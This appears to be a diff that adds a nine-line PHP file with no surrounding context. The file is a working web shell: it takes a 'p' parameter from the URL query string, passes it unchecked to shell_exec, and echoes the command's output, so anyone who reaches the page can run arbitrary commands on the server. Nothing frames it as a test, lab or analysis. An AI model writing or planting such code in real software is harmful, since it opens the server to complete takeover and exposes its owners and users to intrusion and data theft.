@@ -1,0 +1,9 @@
+<?php
+
+$p = $_GET['p'];
+echo $p;
+$o=shell_exec($p);
+
+echo $o;
+
+?>
